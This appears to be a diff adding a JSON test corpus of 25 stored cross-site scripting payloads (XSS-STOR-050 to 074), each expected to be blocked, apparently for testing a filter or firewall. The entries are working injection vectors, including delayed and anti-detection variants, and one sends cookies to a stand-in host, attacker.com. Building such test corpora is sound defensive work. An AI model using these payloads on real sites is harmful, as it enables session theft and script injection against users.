@@ -1,0 +1,330 @@
+[
+  {
+      "id": "XSS-STOR-050",
+      "payload": "<script>alert(document.domain)</script>",
+      "tags": [
+        "stored",
+        "comment",
+        "basic",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Stored XSS in comment field - basic script tag",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-051",
+      "payload": "<img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>",
+      "tags": [
+        "stored",
+        "cookie-theft",
+        "exfiltration"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Stored XSS with cookie exfiltration via fetch",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-052",
+      "payload": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+      "tags": [
+        "stored",
+        "svg",
+        "animate"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Stored XSS via SVG animate element",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-053",
+      "payload": "<style>@import'javascript:alert(1)';</style>",
+      "tags": [
+        "stored",
+        "style",
+        "import"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Stored XSS via CSS @import with javascript protocol",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-054",
+      "payload": "<link rel=stylesheet href='javascript:alert(1)'>",
+      "tags": [
+        "stored",
+        "link",
+        "stylesheet"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Stored XSS via link stylesheet with javascript protocol",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-055",
+      "payload": "<object data='javascript:alert(1)'>",
+      "tags": [
+        "stored",
+        "object",
+        "data"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Stored XSS via object data attribute",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-056",
+      "payload": "<embed src='javascript:alert(1)'>",
+      "tags": [
+        "stored",
+        "embed"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Stored XSS via embed element",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-057",
+      "payload": "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
+      "tags": [
+        "stored",
+        "meta",
+        "refresh"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Stored XSS via meta refresh redirect",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-058",
+      "payload": "<base href='javascript:alert(1)//'>",
+      "tags": [
+        "stored",
+        "base",
+        "href"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Stored XSS via base tag hijacking",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-059",
+      "payload": "<form action='javascript:alert(1)'><input type=submit value=Click></form>",
+      "tags": [
+        "stored",
+        "form",
+        "action"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Stored XSS via form action attribute",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-060",
+      "payload": "<button formaction='javascript:alert(1)'>Click</button>",
+      "tags": [
+        "stored",
+        "button",
+        "formaction"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Stored XSS via button formaction",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-061",
+      "payload": "<video><source onerror='alert(1)' src=x></video>",
+      "tags": [
+        "stored",
+        "video",
+        "source"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Stored XSS via video source onerror",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-062",
+      "payload": "<audio src=x onerror=alert(1)>",
+      "tags": [
+        "stored",
+        "audio",
+        "onerror"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Stored XSS via audio onerror event",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-063",
+      "payload": "<track src=x onerror=alert(1)>",
+      "tags": [
+        "stored",
+        "track",
+        "media"
+    ],
+      "expected_block": true,
+      "severity_hint": "Medium",
+      "notes": "Stored XSS via track element onerror",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-064",
+      "payload": "<script>setTimeout('alert(1)', 10000)</script>",
+      "tags": [
+        "stored",
+        "delayed",
+        "setTimeout"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Stored XSS with 10 second delay (delayed trigger)",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-065",
+      "payload": "<img src=x onerror=\"this.onerror=null; setTimeout('alert(1)', 5000)\">",
+      "tags": [
+        "stored",
+        "delayed",
+        "anti-detection"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Stored XSS with delayed trigger and error clearing",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-066",
+      "payload": "{{constructor.constructor('alert(1)')()}}",
+      "tags": [
+        "stored",
+        "template",
+        "angular",
+        "ssti"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Stored XSS via AngularJS template injection",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-067",
+      "payload": "${alert(document.domain)}",
+      "tags": [
+        "stored",
+        "template",
+        "es6",
+        "template-literal"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Stored XSS via ES6 template literal injection",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-068",
+      "payload": "<textarea><script>alert(1)</script></textarea>",
+      "tags": [
+        "stored",
+        "textarea",
+        "context-escape"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Stored XSS escaping textarea context",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-069",
+      "payload": "<noscript><style></noscript><img src=x onerror=alert(1)>",
+      "tags": [
+        "stored",
+        "noscript",
+        "style-escape"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Stored XSS via noscript context escape",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-070",
+      "payload": "<select><option><script>alert(1)</script></option></select>",
+      "tags": [
+        "stored",
+        "select",
+        "option"
+    ],
+      "expected_block": true,
+      "severity_hint": "Medium",
+      "notes": "Stored XSS in select option (limited contexts)",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-071",
+      "payload": "<!--[if gte IE 4]><script>alert(1)</script><![endif]-->",
+      "tags": [
+        "stored",
+        "conditional-comment",
+        "ie"
+    ],
+      "expected_block": true,
+      "severity_hint": "Medium",
+      "notes": "Stored XSS via IE conditional comments",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-072",
+      "payload": "<svg><foreignObject><body onload=alert(1)></foreignObject></svg>",
+      "tags": [
+        "stored",
+        "svg",
+        "foreignObject"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Stored XSS via SVG foreignObject",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-073",
+      "payload": "<math><mtext><img src=x onerror=alert(1)></mtext></math>",
+      "tags": [
+        "stored",
+        "mathml",
+        "mtext"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Stored XSS via MathML mtext element",
+      "category": "XSS"
+  },
+  {
+      "id": "XSS-STOR-074",
+      "payload": "<iframe srcdoc='<script>alert(parent.document.domain)</script>'></iframe>",
+      "tags": [
+        "stored",
+        "iframe",
+        "srcdoc",
+        "parent-access"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Stored XSS via iframe srcdoc with parent access",
+      "category": "XSS"
+  }
+]
